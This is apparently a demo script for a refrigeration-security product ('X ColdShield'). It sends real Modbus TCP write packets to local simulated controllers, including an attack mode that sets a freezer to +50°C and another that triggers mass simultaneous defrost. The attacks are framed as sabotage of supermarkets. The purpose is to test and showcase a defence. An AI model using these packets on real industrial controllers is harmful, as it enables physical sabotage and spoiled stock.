import socket
import struct
import sys
import time

def build_modbus_write(reg_addr, value):
    # Monta um pacote Modbus TCP real (Function Code 06)
    trans_id = 1
    proto_id = 0
    length = 6
    unit_id = 1
    func_code = 6
    return struct.pack('>HHHBBHh', trans_id, proto_id, length, unit_id, func_code, reg_addr, value)

def run_simulation(port, mode):
    print(f"\n🎯 Conectando ao alvo na porta {port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', port))

        if mode == "legit":
            print("👨‍🔧 [TÉCNICO AUTORIZADO] Ajustando Freezer 1 de -20°C para -22°C (Dentro do limite seguro)...")
            packet = build_modbus_write(reg_addr=0, value=-22)
            sock.sendall(packet)
            resp = sock.recv(1024)
            if resp:
                print("✅ Sucesso! Controlador aceitou a manutenção legítima.")

        elif mode == "attack":
            print("💀 [HACKER - ATAQUE SUPERMERCADOS FRANÇA] Iniciando sabotagem térmica...")
            
            # Passo 1: Ligar degelo da Ilha 1 (Passa, pois 1 degelo isolado é normal)
            print("   -> Ligando resistência de degelo da Ilha 1...")
            sock.sendall(build_modbus_write(reg_addr=10, value=1))
            time.sleep(0.5)

            # Passo 2: Tentar ligar degelo da Ilha 2 simultaneamente (Ataque em massa)
            print("   -> Tentando ligar degelo simultâneo na Ilha 2...")
            sock.sendall(build_modbus_write(reg_addr=11, value=1))
            time.sleep(0.5)

        elif mode == "attack_50c":
            print("💀 [HACKER - ATAQUE 50°C] Enviando comando de Setpoint +50°C para derreter estoque...")
            packet = build_modbus_write(reg_addr=0, value=50)
            sock.sendall(packet)
            resp = sock.recv(1024)
            if not resp:
                print("🛡️  Conexão cortada pelo X ColdShield! O ataque falhou.")
            else:
                print("💥 ATAQUE BEM SUCEDIDO! O freezer foi alterado para +50°C!")

        sock.close()
    except ConnectionResetError:
        print("🛡️  Bloqueado! O X ColdShield derrubou nossa conexão na hora.")
    except Exception as e:
        print(f"Erro: {e}")

if __name__ == '__main__':
    print("Escolha o teste:")
    print("1 - Manutenção Legítima (-22°C) via X ColdShield (Porta 5021)")
    print("2 - ATAQUE HACKER (+50°C) DIRETO no Danfoss sem proteção (Porta 5020)")
    print("3 - ATAQUE HACKER (+50°C) PROTEGIDO pelo X ColdShield (Porta 5021)")
    print("4 - ATAQUE DEGELO EM MASSA PROTEGIDO pelo X ColdShield (Porta 5021)")
    
    choice = input("\nDigite o número (1, 2, 3 ou 4): ").strip()
    if choice == '1':
        run_simulation(5021, "legit")
    elif choice == '2':
        run_simulation(5020, "attack_50c")
    elif choice == '3':
        run_simulation(5021, "attack_50c")
    elif choice == '4':
        run_simulation(5021, "attack")
